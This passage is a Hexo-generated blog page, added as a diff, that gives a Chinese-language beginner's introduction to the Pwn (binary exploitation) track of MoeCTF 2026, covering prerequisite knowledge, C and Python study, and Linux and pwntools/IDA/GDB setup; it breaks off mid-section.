@@ -1,0 +1,1775 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="忘江湖">
+    
+    <meta name="description" content="仗剑观书，落笔留痕，记录行路所见所闻，分享所思所想。">
+    
+    
+    
+    
+    
+    
+    <title>CTF初识之Pwn | 剑行随记————忘江湖之博客</title>
+    <link href="https://Augenstern-W.github.io" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                /* 手机浏览器(尤其iOS/微信)对 fixed 背景不渲染导致背景图消失，改用 scroll */
+                background-image: url('/imgs/xsbg.gif');
+                background-attachment: scroll;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section>
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://Augenstern-W.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">剑行随记————忘江湖之博客</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    
+                    <ul class="dropdown-menu gal-dropdown-menu">
+                        <li class="gal-dropdown-search">
+                            <form role="search" onsubmit="return false;">
+                                <input type="text" class="gal-tag-search" placeholder="输入关键词筛选..." autocomplete="off">
+                            </form>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="网络空间安全学习">
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络空间安全学习</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-empty">无匹配结果</li>
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    
+                    <ul class="dropdown-menu gal-dropdown-menu">
+                        <li class="gal-dropdown-search">
+                            <form role="search" onsubmit="return false;">
+                                <input type="text" class="gal-tag-search" placeholder="输入关键词筛选..." autocomplete="off">
+                            </form>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="ctf">
+                            <a href="/tags/CTF/">CTF</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="crypto">
+                            <a href="/tags/Crypto/">Crypto</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="密码学">
+                            <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="python">
+                            <a href="/tags/Python/">Python</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="markdown">
+                            <a href="/tags/Markdown/">Markdown</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="markdown all in one(vs code 的插件)">
+                            <a href="/tags/markdown-all-in-one-VS-Code-%E7%9A%84%E6%8F%92%E4%BB%B6/">markdown all in one(VS Code 的插件)</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="typora">
+                            <a href="/tags/Typora/">Typora</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="obisidian">
+                            <a href="/tags/Obisidian/">Obisidian</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="sagemath">
+                            <a href="/tags/Sagemath/">Sagemath</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="llm">
+                            <a href="/tags/LLM/">LLM</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="agent">
+                            <a href="/tags/agent/">agent</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="初等数论">
+                            <a href="/tags/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/">初等数论</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="线性代数">
+                            <a href="/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/">线性代数</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="算法基础">
+                            <a href="/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/">算法基础</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="pycryptodome">
+                            <a href="/tags/pycryptodome/">pycryptodome</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="pwntools">
+                            <a href="/tags/pwntools/">pwntools</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="md5在线解密破解">
+                            <a href="/tags/md5%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%A0%B4%E8%A7%A3/">md5在线解密破解</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="彩虹表">
+                            <a href="/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/">彩虹表</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="pwn">
+                            <a href="/tags/Pwn/">Pwn</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="二进制安全">
+                            <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="程序设计">
+                            <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="ida">
+                            <a href="/tags/IDA/">IDA</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="gdb">
+                            <a href="/tags/GDB/">GDB</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="linux">
+                            <a href="/tags/Linux/">Linux</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="编译与汇编">
+                            <a href="/tags/%E7%BC%96%E8%AF%91%E4%B8%8E%E6%B1%87%E7%BC%96/">编译与汇编</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="操作系统">
+                            <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="ai">
+                            <a href="/tags/AI/">AI</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="glibc">
+                            <a href="/tags/GLibc/">GLibc</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="pwn collge">
+                            <a href="/tags/pwn-collge/">pwn collge</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="reverse">
+                            <a href="/tags/Reverse/">Reverse</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="逆向工程">
+                            <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="反编译工具">
+                            <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/">反编译工具</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="动态调试工具">
+                            <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/">动态调试工具</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="其他辅助工具">
+                            <a href="/tags/%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7/">其他辅助工具</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="ai agent">
+                            <a href="/tags/AI-Agent/">AI Agent</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="retoolkit">
+                            <a href="/tags/retoolkit/">retoolkit</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="爱盘">
+                            <a href="/tags/%E7%88%B1%E7%9B%98/">爱盘</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="sandbox">
+                            <a href="/tags/SandBox/">SandBox</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="沙箱逃逸">
+                            <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="魔术方法">
+                            <a href="/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">魔术方法</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="pyjail">
+                            <a href="/tags/Pyjail/">Pyjail</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="jsjail">
+                            <a href="/tags/jsjail/">jsjail</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="bashjail">
+                            <a href="/tags/bashjail/">bashjail</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="cjail">
+                            <a href="/tags/Cjail/">Cjail</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="nc连接远程靶机">
+                            <a href="/tags/nc%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E9%9D%B6%E6%9C%BA/">nc连接远程靶机</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="字符过滤">
+                            <a href="/tags/%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4/">字符过滤</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="对象关系链">
+                            <a href="/tags/%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E9%93%BE/">对象关系链</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="typhon(pyjail一把梭工具)">
+                            <a href="/tags/Typhon-Pyjail%E4%B8%80%E6%8A%8A%E6%A2%AD%E5%B7%A5%E5%85%B7/">Typhon(Pyjail一把梭工具)</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="web">
+                            <a href="/tags/Web/">Web</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="渗透测试">
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="网络协议">
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/">网络协议</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="前端三件套">
+                            <a href="/tags/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/">前端三件套</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="后端">
+                            <a href="/tags/%E5%90%8E%E7%AB%AF/">后端</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="数据库与sql">
+                            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8ESQL/">数据库与SQL</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="web安全与渗透测试">
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全与渗透测试</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="编码与数据格式">
+                            <a href="/tags/%E7%BC%96%E7%A0%81%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/">编码与数据格式</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="浏览器开发者工具">
+                            <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7/">浏览器开发者工具</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="burp suite">
+                            <a href="/tags/Burp-Suite/">Burp Suite</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="yakit">
+                            <a href="/tags/Yakit/">Yakit</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="curl">
+                            <a href="/tags/curl/">curl</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="cyberchef">
+                            <a href="/tags/CyberChef/">CyberChef</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="虚拟机">
+                            <a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="docker">
+                            <a href="/tags/Docker/">Docker</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="xss platform">
+                            <a href="/tags/XSS-Platform/">XSS Platform</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="misc">
+                            <a href="/tags/misc/">misc</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="取证与安全杂项">
+                            <a href="/tags/%E5%8F%96%E8%AF%81%E4%B8%8E%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/">取证与安全杂项</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="bing">
+                            <a href="/tags/Bing/">Bing</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="google">
+                            <a href="/tags/Google/">Google</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="recon">
+                            <a href="/tags/Recon/">Recon</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="encoding">
+                            <a href="/tags/Encoding/">Encoding</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="stego">
+                            <a href="/tags/Stego/">Stego</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="forensics">
+                            <a href="/tags/Forensics/">Forensics</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="traffic">
+                            <a href="/tags/Traffic/">Traffic</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="blockchain">
+                            <a href="/tags/Blockchain/">Blockchain</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="audacity">
+                            <a href="/tags/Audacity/">Audacity</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="aperi&#39;solve">
+                            <a href="/tags/Aperi-Solve/">Aperi&#39;Solve</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="stegsolve">
+                            <a href="/tags/Stegsolve/">Stegsolve</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-item" data-name="exiftool">
+                            <a href="/tags/exiftool/">exiftool</a>
+                        </li>
+                        
+                        <li class="gal-dropdown-empty">无匹配结果</li>
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+<style>
+#gal-header .gal-dropdown-menu {
+    max-height: 65vh;
+    overflow-y: auto;
+    overflow-x: hidden;
+    scrollbar-width: thin;
+}
+#gal-header .gal-dropdown-search {
+    position: sticky;
+    top: 0;
+    z-index: 1;
+    padding: 5px 10px;
+    background: #222;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+}
+#gal-header .gal-dropdown-search input {
+    width: 100%;
+    height: 28px;
+    padding: 2px 8px;
+    font-size: 12px;
+    color: #fff;
+    background: rgba(255, 255, 255, 0.08);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    border-radius: 4px;
+    outline: none;
+}
+#gal-header .gal-dropdown-search input:focus {
+    border-color: #228DFF;
+}
+#gal-header .gal-dropdown-empty {
+    display: none;
+    padding: 6px 14px;
+    color: #888;
+    font-size: 12px;
+}
+</style>
+<script>
+(function () {
+    document.addEventListener('input', function (e) {
+        var input = e.target;
+        if (!input.classList || !input.classList.contains('gal-tag-search')) return;
+        var menu = input.closest('.dropdown-menu');
+        if (!menu) return;
+        var kw = input.value.trim().toLowerCase();
+        var visible = 0;
+        menu.querySelectorAll('.gal-dropdown-item').forEach(function (li) {
+            var hit = !kw || li.getAttribute('data-name').indexOf(kw) !== -1;
+            li.style.display = hit ? '' : 'none';
+            if (hit) visible++;
+        });
+        var empty = menu.querySelector('.gal-dropdown-empty');
+        if (empty) empty.style.display = visible === 0 ? 'block' : 'none';
+    });
+})();
+</script>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://Augenstern-W.github.io">剑行随记————忘江湖之博客</a>
+        >
+        <span>CTF初识之Pwn</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/">CTF初识之Pwn</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/CTF/">CTF</a>, 
+                
+                <a href="/tags/pwntools/">pwntools</a>, 
+                
+                <a href="/tags/Pwn/">Pwn</a>, 
+                
+                <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>, 
+                
+                <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a>, 
+                
+                <a href="/tags/IDA/">IDA</a>, 
+                
+                <a href="/tags/GDB/">GDB</a>, 
+                
+                <a href="/tags/Linux/">Linux</a>, 
+                
+                <a href="/tags/%E7%BC%96%E8%AF%91%E4%B8%8E%E6%B1%87%E7%BC%96/">编译与汇编</a>, 
+                
+                <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>, 
+                
+                <a href="/tags/AI/">AI</a>, 
+                
+                <a href="/tags/GLibc/">GLibc</a>, 
+                
+                <a href="/tags/pwn-collge/">pwn collge</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2026-08-28
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/">CTF初识之Pwn</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2026-08-28
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/CTF/">CTF</a>, 
+                
+                <a href="/tags/pwntools/">pwntools</a>, 
+                
+                <a href="/tags/Pwn/">Pwn</a>, 
+                
+                <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>, 
+                
+                <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a>, 
+                
+                <a href="/tags/IDA/">IDA</a>, 
+                
+                <a href="/tags/GDB/">GDB</a>, 
+                
+                <a href="/tags/Linux/">Linux</a>, 
+                
+                <a href="/tags/%E7%BC%96%E8%AF%91%E4%B8%8E%E6%B1%87%E7%BC%96/">编译与汇编</a>, 
+                
+                <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>, 
+                
+                <a href="/tags/AI/">AI</a>, 
+                
+                <a href="/tags/GLibc/">GLibc</a>, 
+                
+                <a href="/tags/pwn-collge/">pwn collge</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>欢迎诸位来到 pwn 的世界</p>
+<span id="more"></span>
+
+<h2 id="一、欢迎"><a href="#一、欢迎" class="headerlink" title="一、欢迎"></a>一、欢迎</h2><p>欢迎来到 MoeCTF 2026 Pwn。 🥳</p>
+<p>Pwn（读作”砰”，拟声词）一词起源于网络游戏社区，原本表示成功入侵了计算机系统，在 CTF 中则是一种题目方向：通过构造恶意输入达到泄漏信息甚至劫持几乎整个系统（getshell）的目的。其实在 CTF 比赛发展初期，赛题通常只与二进制安全相关，因此 Pwn 是 CTF 领域最原始的方向。在这里，你能深入计算机系统最底层，感受纯粹的计算机科学。 🤤</p>
+<p>接下来，我将和你一起学习，在这篇文档里，帮助你了解 Pwn 是什么、怎么学，希望你能在这场 Pwn 之旅玩的开心！各个工具以及环境配置，都为大家准备了相关帖子的超链接，如果还有问题，欢迎大家随时提问！</p>
+<h2 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h2><p>鉴于本人也不是太了解其他方向，不敢妄言，但是 Pwn 的前置知识绝对算得上很多，从开始入门，到你人生的第一个 flag 还需要一段时间，但请耐心沉淀，你的付出一定会迎来回报！</p>
+<h3 id="计算机数据表示"><a href="#计算机数据表示" class="headerlink" title="计算机数据表示"></a>计算机数据表示</h3><p>Pwn 属于二进制（binary）安全，为什么说是”二进制”？因为计算机只处理和存储二进制信息。与我们日常使用的十进制”逢十进一”不同，”逢二进一”的二进制世界只有”0”和”1”。一位二进制信息称为比特（bit），8 比特为 1 字节（byte），字节通常是计算机处理信息的最小单位，计算机中的信息通常是连续的字节。人类输入给计算机的任何信息（文字、图像、音频等）都可编码为数字信息（二进制比特流）进行处理，需要输出时再解码为原形式。</p>
+<p>不同进制间可相互转换，你需要熟悉进制转换方式，其中最重要的是二进制、十进制、十六进制间的转换。对于 Pwn，我们通常希望轻松阅读内存中的原始数据。为简化二进制表达便于人类理解，我们通常将计算机中二进制数据用十六进制表示：一位十六进制数正好为 4 比特，两位十六进制数为 1 字节。</p>
+<p>有时为方便数据类型转换和运算，计算机存储数字时，数字在内存中的高低位与人类阅读的高低位相反，这种数据存储方式叫”小端存储”。你需要知道大端序（big-endian）和小端序（little-endian）的概念，能够区分它们，并能做到相互转换。关于这一方面的知识，其实可以归结到计算机基础中，这里为你推荐南京大学的一门《计算机系统基础》课程，这里链接给出的仅仅是（一），你不必急于看完，知识的获取不是一蹴而就的，慢慢来，后续还可以在 MOOC 中搜索（二）（三）进行观看。</p>
+<h3 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h3><p>既然 Pwn 涉及逆向程序逻辑，我们需要看懂程序究竟在做什么并寻找其漏洞，那么我们首先得有能力”正向”写出一般的程序吧。电脑无法读懂人类语言，我们必须得用程序设计语言编写程序，并编译（详见下文”编译与汇编”）成电脑能”读懂”并执行的机器码。正在阅读这篇文档的你很可能没有任何编程基础，这很正常。你也许曾了解过 Visual Basic、JavaScript…… 但是对于 Pwn 学习初期，我们一般面对 Linux 环境下的 C 语言。</p>
+<blockquote>
+<p><strong>Note</strong></p>
+<p>现在你已经逐渐进入实操阶段了，实操过程中最重要的是善用搜索引擎（以及一些 AI 大模型），推荐使用必应或谷歌。在接下来的旅程中，你大概需要先配置好”科学上网”工具。</p>
+</blockquote>
+<h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><p>鉴于 C 语言贴近底层且灵活度高，大多数 Pwn 题目程序都由 C 语言编写，大多数逆向工具的逆向结果也是类似 C 语言的伪代码（详见下文”IDA 和 gdb”，后面将为你介绍这两个工具，先别急）。你需要入门学习 C 语言，有两种途径，一个是阅读书本，一个是通过网上的课程，一切取决于你自己更喜欢哪种学习方式。</p>
+<p>推荐书籍有《C Primer Plus》，以及查阅非教程工具网站 C 参考手册（中文）、man7.org（英文）。强烈建议你在 Linux 环境下编译运行 C 语言（详见下文”环境搭建”）。视频课程方面，经典的黑马程序员可以作为一个手段，以及 B 站上其他的一些免费网课都是可以的，你将知道什么是 B 站大学（可不只是可以看番）。</p>
+<p>我们目前不需要完整系统地学习 C 语言（不代表未来不需要）。你需要关注 C 语言中的基础数据类型、流程控制、标准库函数（<code>scanf</code>、<code>printf</code>、<code>puts</code>、<code>strcmp</code>、<code>system</code>、<code>mmap</code> 等）、位操作和指针。</p>
+<p>C 语言能很好地和汇编语言（详见下文”编译与汇编”）对应，学习两者时应相互结合，理解等效的 C 语句和汇编指令。</p>
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>为了能编写漏洞利用脚本（详见下文”Pwntools”），你还需要学习 Python 语言。Python 语言极容易上手，网上教程多如牛毛。你至少需要学会基本语法与数据类型、列表（<code>list</code>）与字典（<code>dict</code>）类型的用法、函数（方法）定义及调用。建议使用 Visual Studio Code 编辑器编写 Python 脚本。（多敲代码才是王道，纸上觉来终觉浅）</p>
+<blockquote>
+<p><strong>TIP</strong></p>
+<p>如果你对计算机科学很感兴趣想系统学习并且英语不错，我强烈建议你看 CS61A 系列课程及其配套电子书学习 Python。同样的，如果想看一些中文课程，不管是慕课还是哔哩哔哩，都同样有很多优质并且免费的课程等待你学习，加油！</p>
+</blockquote>
+<h2 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h2><h3 id="GNU-Linux"><a href="#GNU-Linux" class="headerlink" title="GNU&#x2F;Linux"></a>GNU&#x2F;Linux</h3><p>Linux 是一种自由和开放源代码的类 Unix 操作系统，如今通常用于服务器，我们日常使用的 PC 操作系统通常是 Windows。由于 MoeCTF 以及其他 CTF 比赛中的 Pwn 题目全都在 Linux 特别是 Ubuntu（一个 Linux 发行版）环境中，为了至少能运行 Pwn 题附件的程序（详见下文”做题”），我们当然需要一个 Linux 环境。推荐安装一个 Ubuntu 虚拟机或使用 docker（详见下文”Pwn”），网上教程太多，这里不赘述（善用搜索引擎）。如果你只是想尝试 Pwn，那么 WSL2 也已经够用了，并且更流畅。这里为你推荐一篇 WSL2 的环境搭建文章，当初我也是照着这篇文章搭建的，希望它也能同样帮助到你！</p>
+<h3 id="Pwn-环境"><a href="#Pwn-环境" class="headerlink" title="Pwn 环境"></a>Pwn 环境</h3><p>安装好 Linux 环境后，还需继续搭建 Pwn 环境，这里有一篇十分详尽的文章：</p>
+<ul>
+<li>CTF Wiki - Pwn Environment（中文）</li>
+</ul>
+<p>如果感觉上面的 Wiki 还不够的话，这里还有另一篇文章可以作为参考：</p>
+<ul>
+<li>Pwn 环境搭建</li>
+</ul>
+<p>如果无法完全复刻也没关系，其中有很多在 Pwn 学习后期才会用到的东西。目前你至少需要这三样：</p>
+<ol>
+<li>Linux Python 环境 + pwntools</li>
+<li>静态逆向分析工具（如 IDA）</li>
+<li>Linux 调试器（如 GDB + pwndbg）</li>
+</ol>
+<p>你还需要安装更多工具：<code>checksec</code>、<code>binutils</code>、<code>patchelf</code>、<code>LibcSearcher</code>、<code>glibc-all-in-one</code>、<code>ropper</code>、<code>one_gadget</code>、<code>seccomp-tools</code> 等，其中有很多你目前用不到，但前两个建议先安装好（见上文 Wiki 文章）。</p>
+<p>一个标准的 Pwn 流程是：</p>
+<ol>
+<li>用 <code>checksec</code> 检查保护机制（详见下文”Linux 安全机制”）</li>
+<li>用 <code>patchelf</code> 替换 libc、ld 等（可选）</li>
+<li>用 IDA 反汇编反编译挖掘漏洞</li>
+<li>用 GDB + pwndbg 调试执行确认漏洞</li>
+<li>用 Python + pwntools 编写利用脚本</li>
+</ol>
+<blockquote>
+<p><strong>NOTE</strong></p>
